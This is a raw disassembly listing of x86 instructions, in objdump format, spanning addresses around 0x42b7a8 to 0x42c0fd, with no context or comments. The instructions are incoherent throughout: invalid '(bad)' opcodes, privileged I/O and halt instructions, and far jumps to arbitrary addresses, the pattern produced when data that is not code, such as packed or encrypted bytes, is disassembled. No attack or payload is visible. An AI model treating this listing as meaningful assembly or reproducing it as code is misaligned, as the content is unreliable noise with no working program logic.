  42b7a8:	xchg   edx,eax
  42b7a9:	inc    ecx
  42b7aa:	sti    
  42b7ab:	ins    DWORD PTR es:[edi],dx
  42b7ac:	pop    ds
  42b7ad:	aas    
  42b7ae:	nop
  42b7af:	push   eax
  42b7b0:	add    eax,0x11a542c5
  42b7b5:	xlat   BYTE PTR ds:[ebx]
  42b7b6:	scas   eax,DWORD PTR es:[edi]
  42b7b7:	aad    0x10
  42b7b9:	(bad)  
  42b7ba:	(bad)  
  42b7bc:	sahf   
  42b7bd:	mov    cl,0x17
  42b7bf:	test   al,0x43
  42b7c1:	jmp    0xac568657
  42b7c6:	push   es
  42b7c7:	add    al,0xdf
  42b7c9:	jg     0x42b7e6
  42b7cb:	push   esi
  42b7cc:	mov    dh,0xe6
  42b7ce:	ins    DWORD PTR es:[edi],dx
  42b7cf:	(bad)  
  42b7d0:	int    0x5d
  42b7d2:	or     al,0xa9
  42b7d4:	mov    eax,0x1c6cb249
  42b7d9:	lods   eax,DWORD PTR ds:[esi]
  42b7da:	ins    DWORD PTR es:[edi],dx
  42b7db:	(bad)  
  42b7dc:	cmc    
  42b7dd:	fdivr  QWORD PTR [edi]
  42b7df:	bound  esi,QWORD PTR [esi+0x1b]
  42b7e2:	xor    eax,0x3ea08e93
  42b7e7:	scas   al,BYTE PTR es:[edi]
  42b7e8:	sub    al,0x95
  42b7ea:	stos   BYTE PTR es:[edi],al
  42b7eb:	xchg   esp,eax
  42b7ec:	adc    DWORD PTR [esi+0x6ce4fa47],edi
  42b7f2:	fs jnp 0x42b7af
  42b7f5:	mov    eax,ds:0xba38bea0
  42b7fa:	and    DWORD PTR [esi+0x41],esp
  42b7fd:	ret    0x49d1
  42b800:	mov    bh,0x76
  42b802:	es or  bl,ah
  42b805:	pop    esp
  42b806:	add    DWORD PTR [ebp-0x763e9d5c],0x2b72dfe8
  42b810:	call   edx
  42b812:	pop    ds
  42b813:	pop    ecx
  42b814:	dec    ecx
  42b815:	cmp    eax,0x13b3d8ac
  42b81a:	stos   DWORD PTR es:[edi],eax
  42b81b:	mov    ebx,0x26ee9b3a
  42b820:	aad    0xef
  42b822:	push   es
  42b823:	adc    eax,0x5f1fed07
  42b828:	xor    DWORD PTR [edi-0x6],esi
  42b82b:	dec    eax
  42b82c:	imul   ebx,DWORD PTR [ecx+0x35],0xffffffac
  42b830:	ins    BYTE PTR es:[edi],dx
  42b831:	add    DWORD PTR [ebx+0x76],edi
  42b834:	ins    DWORD PTR es:[edi],dx
	...
  42b895:	add    al,ch
  42b897:	popf   
  42b898:	mov    esi,0xf9e7ffe7
  42b89d:	lahf   
  42b89e:	xor    bl,dh
  42b8a0:	add    ecx,DWORD PTR [esi+0x4dfd75e2]
  42b8a6:	rcl    ecx,1
  42b8a8:	add    DWORD PTR [eax],eax
  42b8aa:	pop    es
  42b8ab:	add    DWORD PTR [eax],eax
  42b8ad:	add    BYTE PTR [ebp-0x3f62779d],al
  42b8b3:	xchg   edx,eax
  42b8b4:	imul   ebp,DWORD PTR [ebx+edx*4+0x2c],0x377a37f2
  42b8bc:	cli    
  42b8bd:	adc    al,0x95
  42b8bf:	retf   
  42b8c0:	xor    al,0xf5
  42b8c2:	out    0xc8,eax
  42b8c4:	pop    ebp
  42b8c5:	aam    0x28
  42b8c7:	xchg   ebp,eax
  42b8c8:	call   0x7ddc:0x90457141
  42b8cf:	lock aam 0xb
  42b8d2:	div    ebp
  42b8d4:	and    ebp,0x89f9f5f7
  42b8da:	test   DWORD PTR [eax+0x7],ecx
  42b8dd:	imul   esi,DWORD PTR [edx+0x3a6db9ed],0x446c21e2
  42b8e7:	inc    DWORD PTR [eax-0x2b]
  42b8ea:	push   0xffffffc6
  42b8ec:	dec    ecx
  42b8ed:	jle    0x42b8b6
  42b8ef:	das    
  42b8f0:	cli    
  42b8f1:	outs   dx,BYTE PTR ds:[esi]
  42b8f2:	(bad)  
  42b8f3:	cmc    
  42b8f4:	fimul  DWORD PTR [ebx+ecx*2-0x1f]
  42b8f8:	inc    ebp
  42b8f9:	inc    ebx
  42b8fa:	ss dec ebx
  42b8fc:	mov    al,0x54
  42b8fe:	shl    BYTE PTR gs:[ecx+0x616b1e7c],cl
  42b905:	mov    edx,0x67a92257
  42b90a:	bound  esi,QWORD PTR [eax+0x19]
  42b90d:	xor    ch,BYTE PTR [edx+0x1]
  42b910:	sahf   
  42b911:	(bad)  
  42b912:	pop    ebx
  42b913:	and    al,0xf5
  42b915:	(bad)  
  42b916:	xor    ecx,DWORD PTR [eax-0xcf89222]
  42b91c:	sub    BYTE PTR [esi],ch
  42b91e:	loop   0x42b910
  42b920:	push   edx
  42b921:	jnp    0x42b8f7
  42b923:	mov    ch,BYTE PTR [ecx+0x30ce37a6]
  42b929:	or     al,0x24
  42b92b:	aad    0xef
  42b92d:	mov    ecx,cs
  42b92f:	adc    esi,ecx
  42b931:	lods   eax,DWORD PTR ds:[esi]
  42b932:	dec    esp
  42b933:	jne    0x42b9ab
  42b935:	cli    
  42b936:	or     DWORD PTR [eax+eax*1+0x45],ebx
  42b93a:	lock (bad) 
  42b93d:	ret    0xc880
  42b940:	sar    DWORD PTR [edx-0x3d24174f],0x38
  42b947:	dec    edi
  42b948:	xchg   esi,eax
  42b949:	test   al,0x83
  42b94b:	aad    0x25
  42b94d:	inc    ebx
  42b94e:	mov    al,0xcb
  42b950:	xchg   DWORD PTR [ecx-0x79c5c2a3],ebp
  42b956:	pushf  
  42b957:	xchg   DWORD PTR [esi-0x7e40b355],edi
  42b95d:	call   0x26b8:0x433b1ca4
  42b964:	(bad)  
  42b965:	lock xor eax,0xd1b5a63e
  42b96b:	xchg   esp,eax
  42b96c:	lea    esp,[esi+0x7e2ea0fc]
  42b972:	or     eax,0xb25f452c
  42b977:	xchg   esp,eax
  42b978:	jne    0x42b908
  42b97a:	bound  eax,QWORD PTR [esi]
  42b97c:	push   es
  42b97d:	add    BYTE PTR [eax+0x4a],ch
  42b980:	mov    ds:0x47557a5a,al
  42b985:	sub    eax,DWORD PTR [ecx+eax*2-0x2d]
  42b989:	or     al,BYTE PTR [eax]
  42b98b:	idiv   ch
  42b98d:	lods   al,BYTE PTR ds:[esi]
  42b98e:	dec    edi
  42b98f:	sbb    bl,BYTE PTR [eax*4+0x583580a0]
  42b996:	and    al,dh
  42b998:	shr    BYTE PTR [ebp-0x62],1
  42b99b:	xor    BYTE PTR [edx],dl
  42b99d:	sub    ebp,DWORD PTR [ecx-0x32]
  42b9a0:	hlt    
  42b9a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b9a2:	xchg   ebx,eax
  42b9a3:	mov    ds,WORD PTR [esi]
  42b9a5:	nop
  42b9a6:	outs   dx,DWORD PTR ds:[esi]
  42b9a7:	sub    DWORD PTR gs:[esi+0x40],esi
  42b9ab:	dec    ebx
  42b9ac:	xchg   esp,eax
  42b9ad:	mov    ebx,0xee4918aa
  42b9b2:	loope  0x42b9cf
  42b9b4:	pop    es
	...
  42ba15:	add    BYTE PTR [ebx-0x431d4ff9],cl
  42ba1b:	neg    ebx
  42ba1d:	outs   dx,DWORD PTR ds:[esi]
  42ba1e:	xor    DWORD PTR [eax-0x80],eax
  42ba21:	fldl2e 
  42ba23:	mov    BYTE PTR [ebx+0x1d2d8f2],ch
  42ba29:	add    BYTE PTR [edi],al
  42ba2b:	add    DWORD PTR [eax],eax
  42ba2d:	add    BYTE PTR [edi+0x5d13f7e3],al
  42ba33:	add    ebp,0xffffffc0
  42ba36:	rcl    DWORD PTR [ecx+0x4b7a3e0e],1
  42ba3c:	mov    cl,0x2c
  42ba3e:	jmp    0x2b75:0xe913cc50
  42ba45:	mov    bl,0x2b
  42ba47:	mov    ch,0xb4
  42ba49:	ret    0xdfb
  42ba4c:	mov    bh,0xc
  42ba4e:	cmp    DWORD PTR [edi-0x1e5d522f],ebx
  42ba54:	lds    ebp,FWORD PTR [eax-0x45523ec1]
  42ba5a:	sub    al,0xd5
  42ba5c:	aad    0x84
  42ba5e:	mov    ch,0x92
  42ba60:	pusha  
  42ba61:	mov    ebx,0x54296fad
  42ba66:	mov    esp,0x5a76592f
  42ba6b:	fmul   QWORD PTR [eax-0x166aeea7]
  42ba71:	push   ebx
  42ba72:	sbb    al,0x8d
  42ba74:	jbe    0x42baee
  42ba76:	ds push esp
  42ba78:	sar    BYTE PTR [edx-0x7f455568],1
  42ba7e:	jmp    0x42ba84
  42ba80:	sbb    al,0xd9
  42ba82:	xchg   esp,eax
  42ba83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ba84:	push   eax
  42ba85:	repz sbb ch,BYTE PTR [edi+0x33]
  42ba89:	ins    BYTE PTR es:[edi],dx
  42ba8a:	in     al,0xa0
  42ba8c:	das    
  42ba8d:	xchg   BYTE PTR [edx-0x67],al
  42ba90:	fsubr  st,st(5)
  42ba92:	mov    ds:0x5c1cb6e1,eax
  42ba97:	sub    eax,0x2462bc47
  42ba9c:	aaa    
  42ba9d:	in     al,dx
  42ba9e:	dec    eax
  42ba9f:	ins    DWORD PTR es:[edi],dx
  42baa0:	icebp  
  42baa1:	push   edx
  42baa2:	ins    DWORD PTR es:[edi],dx
  42baa3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42baa4:	out    dx,eax
  42baa5:	or     BYTE PTR [esp+edx*4-0x4e],dh
  42baa9:	sub    dh,0x94
  42baac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42baad:	xor    al,0x4f
  42baaf:	out    0x39,al
  42bab1:	imul   ebp,DWORD PTR [ebx],0xc596f444
  42bab7:	int    0x85
  42bab9:	js     0x42baeb
  42babb:	arpl   cx,bp
  42babd:	lods   eax,DWORD PTR ds:[esi]
  42babe:	pop    eax
  42babf:	add    esi,DWORD PTR ds:0x2452fba7
  42bac5:	lahf   
  42bac6:	mov    dl,0x56
  42bac8:	cld    
  42bac9:	shr    esi,cl
  42bacb:	aas    
  42bacc:	pop    es
  42bacd:	push   es
  42bace:	and    dh,BYTE PTR [eax-0x532b820c]
  42bad4:	fmul   QWORD PTR [ebp+edi*4+0xfd850ff]
  42badb:	xchg   BYTE PTR [ebp+0x692d6bc],ch
  42bae1:	sahf   
  42bae2:	sti    
  42bae3:	(bad)  
  42bae5:	xor    al,dl
  42bae7:	mov    ah,0x86
  42bae9:	sar    DWORD PTR [edi+0x7001b6d6],0x9f
  42baf0:	stc    
  42baf1:	sub    cl,bl
  42baf3:	add    BYTE PTR [eax],al
  42baf5:	cmp    al,0x1e
  42baf7:	sbb    al,0x8c
  42baf9:	stos   DWORD PTR es:[edi],eax
  42bafa:	sbb    DWORD PTR fs:[ebx-0x3c],ecx
  42bafe:	xchg   esp,eax
  42baff:	lahf   
  42bb00:	jp     0x42bb50
  42bb02:	push   esp
  42bb03:	sahf   
  42bb04:	push   edi
  42bb05:	mov    edx,0x25133eb8
  42bb0a:	sbb    eax,0xb27a8ed6
  42bb0f:	inc    ebx
  42bb10:	push   es
  42bb11:	(bad)  
  42bb12:	js     0x42bb10
  42bb14:	repz repz mov bl,0x8
  42bb18:	loop   0x42bab0
  42bb1a:	add    ch,ch
  42bb1c:	jns    0x42bab4
  42bb1e:	test   eax,0x21fbfaf6
  42bb23:	push   edi
  42bb24:	loop   0x42baa8
  42bb26:	push   ebp
  42bb27:	loope  0x42bb76
  42bb29:	xchg   edx,eax
  42bb2a:	test   eax,0xccdcc52
  42bb2f:	test   eax,0xf1a55ba6
  42bb34:	test   DWORD PTR [eax],0x0
	...
  42bb96:	xor    al,0x28
  42bb98:	add    DWORD PTR [esi],eax
  42bb9a:	sbb    eax,0x283a372f
  42bb9f:	in     al,0xd1
  42bba1:	and    ebx,ecx
  42bba3:	and    eax,0xd3dfda4d
  42bba8:	add    DWORD PTR [eax],eax
  42bbaa:	pop    es
  42bbab:	add    DWORD PTR [eax],eax
  42bbad:	add    BYTE PTR [ebx],bl
  42bbaf:	mov    dl,BYTE PTR [ecx]
  42bbb1:	(bad)  [ecx]
  42bbb3:	cwde   
  42bbb4:	push   ds
  42bbb5:	adc    DWORD PTR [esi],ebp
  42bbb7:	outs   dx,DWORD PTR ds:[esi]
  42bbb8:	and    al,0xde
  42bbba:	inc    esi
  42bbbb:	in     eax,dx
  42bbbc:	pop    ecx
  42bbbd:	jmp    0x42bbd9
  42bbbf:	(bad)  
  42bbc1:	leave  
  42bbc2:	dec    edi
  42bbc3:	stos   BYTE PTR es:[edi],al
  42bbc4:	fwait
  42bbc5:	xor    al,0x13
  42bbc7:	loopne 0x42bb51
  42bbc9:	imul   ebx,DWORD PTR [ecx],0x6fd12d21
  42bbcf:	xor    eax,0xf25ab09
  42bbd4:	out    0xc1,eax
  42bbd6:	mov    bh,0x36
  42bbd8:	jb     0x42bc53
  42bbda:	(bad)  
  42bbdb:	scas   eax,DWORD PTR es:[edi]
  42bbdc:	xchg   esi,eax
  42bbdd:	(bad)  
  42bbde:	sub    bh,BYTE PTR [edx+0x4a19cdfd]
  42bbe4:	ins    DWORD PTR es:[edi],dx
  42bbe5:	ins    DWORD PTR es:[edi],dx
  42bbe6:	add    ecx,ebp
  42bbe8:	xchg   esi,eax
  42bbe9:	fistp  DWORD PTR [edx-0x36958274]
  42bbef:	fisttp QWORD PTR [eax]
  42bbf1:	scas   al,BYTE PTR es:[edi]
  42bbf2:	mov    ds:0x3b589ce,al
  42bbf7:	bound  ebp,QWORD PTR [ebx+ebp*4]
  42bbfa:	jg     0x42bbe5
  42bbfc:	cmp    eax,0xc5c63005
  42bc01:	xor    BYTE PTR [eax-0x21439a88],dl
  42bc07:	addr16 mov eax,ds:0x62c
  42bc0b:	dec    eax
  42bc0c:	(bad)  
  42bc0d:	ja     0x42bc8c
  42bc0f:	sbb    DWORD PTR [ebx+edi*8],0xffffffbd
  42bc13:	loop   0x42bbca
  42bc15:	jmp    0x8497d5e0
  42bc1a:	jmp    0x42bc8f
  42bc1c:	or     esp,ebp
  42bc1e:	inc    edi
  42bc1f:	scas   eax,DWORD PTR es:[edi]
  42bc20:	xchg   ebp,eax
  42bc21:	pushf  
  42bc22:	pop    edx
  42bc23:	cmp    ebp,DWORD PTR [esi-0x34a28a59]
  42bc29:	inc    ebp
  42bc2a:	or     al,cl
  42bc2c:	out    dx,al
  42bc2d:	cmp    eax,0xb5435381
  42bc32:	sahf   
  42bc33:	add    al,0x6
  42bc35:	dec    ebx
  42bc36:	fcom   DWORD PTR [ebx-0x7c429ffe]
  42bc3c:	leave  
  42bc3d:	xchg   ebp,eax
  42bc3e:	lods   eax,DWORD PTR ds:[esi]
  42bc3f:	ins    BYTE PTR es:[edi],dx
  42bc40:	lods   al,BYTE PTR ds:[esi]
  42bc41:	xchg   ebp,eax
  42bc42:	mov    al,0xf5
  42bc44:	adc    eax,0x75c5111d
  42bc49:	cmp    esi,esi
  42bc4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bc4d:	pop    edx
  42bc4e:	out    0x43,eax
  42bc50:	adc    bh,dl
  42bc52:	pop    esp
  42bc53:	leave  
  42bc54:	stos   BYTE PTR es:[edi],al
  42bc55:	iret   
  42bc56:	loope  0x42bc03
  42bc58:	mov    dl,BYTE PTR [ecx-0x50]
  42bc5b:	and    ah,al
  42bc5d:	stos   BYTE PTR es:[edi],al
  42bc5e:	das    
  42bc5f:	jecxz  0x42bcc1
  42bc61:	xchg   esi,eax
  42bc62:	mov    eax,0x924d5227
  42bc67:	add    BYTE PTR [ebp-0x4f1e5ce1],bl
  42bc6d:	lock and al,0xe8
  42bc70:	repz retw 
  42bc73:	push   0x53
  42bc75:	mov    bh,0x81
  42bc77:	ret    0xdf46
  42bc7a:	test   DWORD PTR [edi+0x7f],0x23ae6e67
  42bc81:	outs   dx,BYTE PTR ds:[esi]
  42bc82:	cmp    al,0x89
  42bc84:	enter  0x493f,0x57
  42bc88:	pop    edi
  42bc89:	jb     0x42bce8
  42bc8b:	or     BYTE PTR [ecx],cl
  42bc8d:	xchg   ecx,eax
  42bc8e:	jp     0x42bc9f
  42bc90:	and    DWORD PTR [edx-0x34953dd0],ecx
  42bc96:	repnz inc eax
  42bc98:	sbb    esi,DWORD PTR [edx]
  42bc9a:	imul   edi,DWORD PTR [eax+ecx*4-0x31683dd4],0xffffff86
  42bca2:	sbb    BYTE PTR [ebp-0x7773f638],cl
  42bca8:	mov    gs,WORD PTR [esi+0x5a438fda]
  42bcae:	push   esi
  42bcaf:	dec    ebp
  42bcb0:	cmp    al,BYTE PTR [edi]
  42bcb2:	in     eax,dx
  42bcb3:	pop    ebx
  42bcb4:	dec    edx
	...
  42bd15:	add    BYTE PTR [eax-0x61eb634a],dh
  42bd1b:	ds mov eax,0xde938ab6
  42bd21:	stc    
  42bd22:	call   0xe66a9287
  42bd27:	aam    0x1
  42bd29:	add    BYTE PTR [edi],al
  42bd2b:	add    DWORD PTR [eax],eax
  42bd2d:	add    BYTE PTR [ebx+ecx*2-0x5b],al
  42bd31:	imul   eax,esi,0x143ef0f
  42bd37:	push   ss
  42bd38:	popf   
  42bd39:	sti    
  42bd3a:	mov    DWORD PTR [ecx+0x190b36d6],esp
  42bd40:	pop    eax
  42bd41:	cmp    DWORD PTR [ebx],esi
  42bd43:	push   eax
  42bd44:	es data16 (bad) 
  42bd47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bd48:	adc    al,0x37
  42bd4a:	mov    DWORD PTR ds:0x87a4df54,edx
  42bd50:	inc    esp
  42bd51:	data16 jae 0x42bdc9
  42bd54:	cld    
  42bd55:	sti    
  42bd56:	popa   
  42bd57:	mov    ch,BYTE PTR ds:0x4d5c913d
  42bd5d:	push   eax
  42bd5e:	fdivrp st(2),st
  42bd60:	or     al,0xbc
  42bd63:	fwait
  42bd64:	dec    ebp
  42bd65:	pop    eax
  42bd66:	fistp  WORD PTR [ecx+ebp*1]
  42bd69:	xor    DWORD PTR [ebx-0x13],eax
  42bd6c:	test   ebp,edx
  42bd6e:	xrelease mov BYTE PTR ds:0x83050d56,0xde
  42bd76:	mov    DWORD PTR [edx+ecx*4-0x17],ebx
  42bd7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bd7b:	into   
  42bd7c:	jge    0x42bd12
  42bd7e:	mov    dl,0x1a
  42bd80:	repz retf 0xd28a
  42bd84:	or     bh,BYTE PTR [eax+0x4f]
  42bd87:	mov    dh,0xf8
  42bd89:	addr16 aas 
  42bd8b:	nop
  42bd8c:	xchg   ebx,eax
  42bd8d:	jge    0x42bd2f
  42bd8f:	push   esi
  42bd90:	addr16 xchg edx,eax
  42bd92:	xchg   ebx,eax
  42bd93:	push   ebx
  42bd94:	add    BYTE PTR [ebx-0xc],bl
  42bd97:	pop    edi
  42bd98:	jmp    0x42bdc8
  42bd9a:	mov    ecx,esp
  42bd9c:	ret    0xc95d
  42bd9f:	out    0x5b,al
  42bda1:	pop    eax
  42bda2:	pusha  
  42bda3:	lock fst QWORD PTR [edx+0x503938f3]
  42bdaa:	or     dh,BYTE PTR [edi+0x61]
  42bdad:	push   0x4ff01625
  42bdb2:	retf   
  42bdb3:	fisubr DWORD PTR [ecx-0x2917fe07]
  42bdb9:	call   0x4c0c1533
  42bdbe:	outs   dx,DWORD PTR ds:[esi]
  42bdbf:	sti    
  42bdc0:	loopne 0x42bddb
  42bdc2:	pusha  
  42bdc3:	pop    ecx
  42bdc4:	stos   BYTE PTR es:[edi],al
  42bdc5:	and    eax,0x92542abb
  42bdca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bdcb:	leave  
  42bdcc:	bt     DWORD PTR [ecx-0x7e],ebp
  42bdd0:	stos   DWORD PTR es:[edi],eax
  42bdd1:	loop   0x42bde4
  42bdd3:	pop    esi
  42bdd4:	or     BYTE PTR [ecx+esi*4-0x15ba685e],0x19
  42bddc:	sbb    edi,edx
  42bdde:	jp     0x42be55
  42bde0:	xor    edi,DWORD PTR [edx-0x5b]
  42bde3:	sub    BYTE PTR [ebx-0x5df6c308],dl
  42bde9:	pusha  
  42bdea:	push   ebx
  42bdeb:	ins    DWORD PTR es:[edi],dx
  42bdec:	and    eax,0x97acd61f
  42bdf1:	dec    eax
  42bdf2:	push   esp
  42bdf3:	and    ebp,DWORD PTR [edi]
  42bdf5:	mov    esp,0xbb2596e5
  42bdfa:	xor    ecx,DWORD PTR [ecx-0x79]
  42bdfd:	dec    ebx
  42bdfe:	icebp  
  42bdff:	into   
  42be00:	ss mov edi,0x215ed7ad
  42be06:	loopne 0x42bd97
  42be08:	and    al,0x9f
  42be0a:	into   
  42be0b:	ret    
  42be0c:	xlat   BYTE PTR ds:[ebx]
  42be0d:	aad    0x5b
  42be0f:	lock mov esi,0x30ea244
  42be15:	sub    eax,0xc954262b
  42be1a:	(bad)  
  42be1c:	aas    
  42be1d:	out    0xb4,eax
  42be1f:	mov    ebp,ds
  42be21:	xor    esp,ecx
  42be23:	test   DWORD PTR [ecx+ebx*2-0x11],edx
  42be27:	pop    eax
  42be28:	sub    ch,BYTE PTR [edi-0x1]
  42be2b:	leave  
  42be2c:	mov    al,0x4a
  42be2e:	xchg   edx,eax
  42be2f:	and    al,0x43
  42be31:	xor    eax,0xe9cc52
	...
  42be96:	xchg   edi,eax
  42be97:	and    BYTE PTR [edi-0x26],al
  42be9a:	idiv   edi
  42be9c:	lahf   
  42be9d:	ins    DWORD PTR es:[edi],dx
  42be9e:	jae    0x42bef8
  42bea0:	fcmovnu st,st(5)
  42bea2:	pop    ds
  42bea3:	xchg   ecx,eax
  42bea4:	cmovno ebp,ebp
  42bea7:	aad    0x1
  42bea9:	add    BYTE PTR [edi],al
  42beab:	add    DWORD PTR [eax],eax
  42bead:	add    al,bl
  42beaf:	pop    edx
  42beb0:	out    0x96,eax
  42beb2:	and    al,0x49
  42beb4:	nop
  42beb5:	adc    esi,DWORD PTR [esi+0x19ba4724]
  42bebb:	ret    0x5e15
  42bebe:	dec    ebp
  42bebf:	adc    DWORD PTR [esi],ecx
  42bec1:	push   cs
  42bec2:	inc    edi
  42bec3:	mov    al,0x94
  42bec5:	sub    ah,BYTE PTR [esi]
  42bec7:	add    esi,DWORD PTR [ecx]
  42bec9:	mov    edi,0xe36ddd9c
  42bece:	jnp    0x42be79
  42bed0:	mov    dh,0x25
  42bed2:	mov    BYTE PTR [esi],cl
  42bed4:	scas   al,BYTE PTR es:[edi]
  42bed5:	imul   edx,DWORD PTR [esi],0x53c0d3e2
  42bedb:	fld    TBYTE PTR [ecx]
  42bedd:	dec    edx
  42bede:	xor    eax,0x1947170b
  42bee3:	and    ah,BYTE PTR [esi]
  42bee5:	fmul   st,st(5)
  42bee7:	loopne 0x42bf48
  42bee9:	cmp    al,BYTE PTR [ecx]
  42beeb:	mov    ds:0x740346b5,eax
  42bef0:	and    ebp,ecx
  42bef2:	nop
  42bef3:	sar    DWORD PTR [edx-0x14],0x52
  42bef7:	pusha  
  42bef8:	repnz std 
  42befa:	data16 sbb al,0xc3
  42befd:	pop    edi
  42befe:	sbb    eax,0xc1098ac3
  42bf03:	xchg   edx,eax
  42bf04:	ins    DWORD PTR es:[edi],dx
  42bf05:	mov    dl,0xbe
  42bf07:	retf   
  42bf08:	repnz popf 
  42bf0a:	mov    edx,0x75ef8c6e
  42bf0f:	jo     0x42bf2e
  42bf11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bf12:	inc    esp
  42bf13:	mov    ds:0xdee4d4ef,al
  42bf18:	aas    
  42bf19:	jns    0x42beba
  42bf1b:	(bad)  
  42bf1d:	fild   WORD PTR [esp+edi*1-0x6f]
  42bf21:	push   esp
  42bf22:	fxch   st(5)
  42bf24:	fwait
  42bf25:	les    eax,FWORD PTR [ebp+0x6e222de2]
  42bf2b:	xor    ch,BYTE PTR [eax+esi*1+0x19]
  42bf2f:	sub    DWORD PTR [eax+ecx*8+0x69cb45be],ebp
  42bf36:	adc    ebx,ebp
  42bf38:	or     al,dl
  42bf3a:	xor    BYTE PTR [ebp+0x471cc0e],ch
  42bf40:	das    
  42bf41:	pushf  
  42bf42:	and    DWORD PTR [esi-0x3a],esp
  42bf45:	inc    esi
  42bf46:	scas   al,BYTE PTR es:[edi]
  42bf47:	rcl    ch,cl
  42bf49:	outs   dx,DWORD PTR es:[esi]
  42bf4b:	sbb    al,BYTE PTR [ebp-0x2e9dc896]
  42bf51:	push   ebp
  42bf52:	and    BYTE PTR [eax-0x33],dl
  42bf55:	push   eax
  42bf56:	pop    esp
  42bf57:	inc    eax
  42bf58:	xor    ecx,ebp
  42bf5a:	jge    0x42beea
  42bf5c:	jne    0x42beea
  42bf5e:	fbstp  TBYTE PTR [edi+0x68]
  42bf61:	sti    
  42bf62:	push   esi
  42bf63:	setle  BYTE PTR [esi+0x6f965235]
  42bf6a:	dec    esi
  42bf6b:	add    BYTE PTR [ecx],ch
  42bf6d:	push   edi
  42bf6e:	push   edi
  42bf6f:	jo     0x42bf92
  42bf71:	add    al,0x81
  42bf73:	mov    al,ds:0x82a6321a
  42bf78:	ds jl  0x42bf68
  42bf7b:	stos   BYTE PTR es:[edi],al
  42bf7c:	(bad)  
  42bf7d:	hlt    
  42bf7e:	shl    BYTE PTR [edi-0x13cdc8c3],1
  42bf84:	or     edi,edi
  42bf86:	pop    esi
  42bf87:	jbe    0x42bfc0
  42bf89:	push   0x4bdd44c0
  42bf8e:	inc    ebx
  42bf8f:	cmp    al,0x7b
  42bf91:	jnp    0x42bf6e
  42bf93:	cmp    DWORD PTR [ebx-0x2f],0x4b3f372
  42bf9a:	dec    ebp
  42bf9b:	lds    ecx,FWORD PTR [ecx+0x55]
  42bf9e:	(bad)  
  42bf9f:	shl    bl,1
  42bfa1:	fbstp  TBYTE PTR [esi+0x6677a]
  42bfa7:	mov    eax,0xd6becb14
  42bfac:	call   0x66984f7e
  42bfb1:	fist   DWORD PTR [eax+ebp*2+0xd9]
	...
  42c014:	add    BYTE PTR [eax],al
  42c016:	cmp    dl,BYTE PTR [edx-0x800cd89]
  42c01c:	jg     0x42bfb8
  42c01e:	xchg   ebx,eax
  42c01f:	mov    al,ds:0x9449f806
  42c024:	add    al,0x24
  42c026:	hlt    
  42c027:	(bad)  
  42c028:	add    DWORD PTR [eax],eax
  42c02a:	pop    es
  42c02b:	add    DWORD PTR [eax],eax
  42c02d:	add    BYTE PTR [esi-0x7b56bbde],ah
  42c033:	shr    BYTE PTR [ecx+0x325ba824],1
  42c039:	hlt    
  42c03a:	inc    edx
  42c03b:	cmp    al,0x59
  42c03d:	sub    cl,BYTE PTR [ecx]
  42c03f:	cwde   
  42c040:	add    esi,eax
  42c042:	sbb    DWORD PTR [eax+0x5d],0xffffff98
  42c046:	leave  
  42c047:	push   cs
  42c048:	loop   0x42c0a9
  42c04a:	test   eax,0xde5a25c
  42c04f:	lea    ecx,[ebp+0x40eead94]
  42c055:	mov    fs,edx
  42c057:	jae    0x42bfeb
  42c059:	xchg   BYTE PTR [eax+0x12],dh
  42c05c:	sub    BYTE PTR [edi+ecx*4],cl
  42c05f:	cwde   
  42c060:	mov    esp,0xdb6dc82c
  42c065:	repnz fwait
  42c067:	in     al,0xcc
  42c069:	ret    
  42c06a:	jbe    0x42c069
  42c06c:	lods   eax,DWORD PTR ds:[esi]
  42c06d:	and    al,0x30
  42c06f:	fidiv  DWORD PTR [ecx-0x58]
  42c072:	arpl   bp,dx
  42c074:	cmp    DWORD PTR ds:0x82e89e5d,edi
  42c07a:	fiadd  DWORD PTR [ecx-0x63]
  42c07d:	push   edx
  42c07e:	std    
  42c07f:	into   
  42c080:	add    eax,0x5c751cd
  42c085:	jmp    0x42c0fe
  42c087:	fs xchg ecx,eax
  42c089:	push   eax
  42c08a:	mov    BYTE PTR [ebp+0x63],al
  42c08d:	mov    bl,0xa5
  42c08f:	mov    BYTE PTR [eax],cl
  42c091:	push   edx
  42c092:	and    DWORD PTR [esi],edi
  42c094:	pop    edi
  42c095:	cmp    esi,DWORD PTR [ebx-0x3e]
  42c098:	addr16 adc esi,esi
  42c09b:	sub    BYTE PTR [esp+edx*4-0x69],ah
  42c09f:	add    ebp,esi
  42c0a1:	push   ss
  42c0a2:	loopne 0x42c0ff
  42c0a4:	cli    
  42c0a5:	icebp  
  42c0a6:	sub    al,0x81
  42c0a8:	adc    BYTE PTR [edi+eax*4+0x630170a3],bl
  42c0af:	bound  ebx,QWORD PTR [ecx+0x40]
  42c0b2:	bound  esp,QWORD PTR [ecx+0x73]
  42c0b5:	sbb    DWORD PTR [esi-0x4f],0xd3a44cae
  42c0bc:	mov    bh,0x57
  42c0be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c0bf:	xchg   edi,eax
  42c0c0:	push   cs
  42c0c1:	mov    al,0xff
  42c0c3:	ror    BYTE PTR [edx],0x9b
  42c0c6:	ror    bl,1
  42c0c8:	cmc    
  42c0c9:	xor    bh,ah
  42c0cb:	xchg   edx,eax
  42c0cc:	repnz push ds
  42c0ce:	jno    0x42c0a0
  42c0d0:	mov    ?,esp
  42c0d2:	iret   
  42c0d3:	dec    esp
  42c0d4:	xchg   esp,eax
  42c0d5:	fmul   DWORD PTR [esi+0x30b22fca]
  42c0db:	push   ebx
  42c0dc:	repnz mov ecx,0xde1ac824
  42c0e2:	adc    edx,ebp
  42c0e4:	lea    esi,[edi+0x12ee1baf]
  42c0ea:	and    ah,BYTE PTR [esi+0x40]
  42c0ed:	les    ecx,FWORD PTR [edi-0x39]
  42c0f0:	ficomp WORD PTR [ecx]
  42c0f2:	mov    ch,0xf4
  42c0f4:	xchg   esp,eax
  42c0f5:	xor    DWORD PTR [ebp-0x44],ecx
  42c0f8:	mov    esi,0xa8c618f4
  42c0fd:	ins    BYTE PTR es:[edi],dx
